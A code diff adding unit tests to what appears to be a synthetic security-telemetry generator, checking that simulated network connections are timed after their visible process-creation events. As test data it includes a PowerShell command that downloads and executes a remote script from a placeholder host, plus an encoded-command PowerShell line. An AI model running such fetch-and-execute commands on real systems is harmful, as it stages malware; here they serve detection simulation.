@@ -9,11 +9,14 @@ from types import SimpleNamespace
 from typing import Any
 
 from evidenceforge.events.contexts import FileTransferContext, HostContext
+from evidenceforge.generation.activity import ActivityGenerator
 from evidenceforge.generation.activity.generator import _zeek_conn_observation_time
 from evidenceforge.generation.engine.storyline import (
     StorylineMixin,
     _linux_shell_process_command_line,
 )
+from evidenceforge.generation.source_timing import SourceTimingPlanner
+from evidenceforge.generation.state_manager import StateManager
 from evidenceforge.models.scenario import ConnectionEventSpec, System, User
 
 
@@ -199,6 +202,48 @@ class TestStorylineCommandNetworks:
         assert engine._storyline_authored_ip_for_hostname("two.example") == "192.0.2.20"
         assert field_reads == 12
 
+    def test_activity_generator_remembers_rendered_process_create_time(self):
+        class _ProcessTimingEmitter:
+            render_time: datetime | None = None
+
+            @staticmethod
+            def can_handle(event: Any) -> bool:
+                return event.event_type == "process_create"
+
+            def emit(self, event: Any) -> None:
+                self.render_time = SourceTimingPlanner().source_time(
+                    event,
+                    "source.ecar_process_create",
+                    seed_parts=("test",),
+                    not_before=event.timestamp,
+                )
+
+        emitter = _ProcessTimingEmitter()
+        state_manager = StateManager()
+        generator = ActivityGenerator(state_manager, {"ecar": emitter})
+        actor = User(username="alice", full_name="Alice Example", email="alice@example.com")
+        system = System(
+            hostname="SRC",
+            ip="10.10.0.10",
+            os="Windows 11 Enterprise",
+            type="workstation",
+        )
+        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        state_manager.set_current_time(event_time)
+
+        pid = generator.generate_process(
+            actor,
+            system,
+            event_time,
+            "0x3e7",
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
+            parent_pid=4,
+        )
+
+        assert emitter.render_time is not None
+        assert generator.process_source_create_time(system.hostname, pid) == emitter.render_time
+
 
 class _FakeActivityGenerator:
     def __init__(self) -> None:
@@ -206,6 +251,7 @@ class _FakeActivityGenerator:
         self.connections: list[dict] = []
         self.explicit_credentials: list[dict] = []
         self.processes: list[dict] = []
+        self.process_source_times: dict[tuple[str, int], datetime] = {}
         self.service_installs: list[dict] = []
         self.dhcp_leases: list[dict] = []
         self.syslog_events: list[dict] = []
@@ -263,6 +309,9 @@ class _FakeActivityGenerator:
         self.connections.append(kwargs)
         return "Cscptransfer00001"
 
+    def process_source_create_time(self, hostname: str, pid: int) -> datetime | None:
+        return self.process_source_times.get((hostname, pid))
+
     def generate_explicit_credentials(self, **kwargs: Any) -> None:
         self.explicit_credentials.append(kwargs)
 
@@ -318,6 +367,54 @@ class _FakeStateManager:
 
 
 class TestStorylineScpCorrelation:
+    def test_process_url_connection_waits_for_visible_process_create(self):
+        source = System(
+            hostname="SRC",
+            ip="10.10.0.10",
+            os="Windows 11 Enterprise",
+            type="workstation",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source], service_accounts=[])
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        event_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        visible_process_time = event_time + timedelta(seconds=4)
+        engine.activity_generator.process_source_times[(source.hostname, 4242)] = (
+            visible_process_time
+        )
+        spec = SimpleNamespace(
+            type="process",
+            process_name=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                "powershell.exe -NoProfile -Command "
+                '"IEX (New-Object Net.WebClient).DownloadString('
+                "'https://cdn.example.test/stage.ps1')\""
+            ),
+        )
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=source,
+            time=event_time,
+            activity="download stage",
+            explicit_types={"process"},
+        )
+
+        conn = engine.activity_generator.connections[0]
+        assert conn["time"] > visible_process_time
+        assert conn["pid"] == 4242
+        assert conn["hostname"] == "cdn.example.test"
+
     def test_scp_receiver_artifacts_reuse_network_source_port(self):
         source = System(
             hostname="SRC",
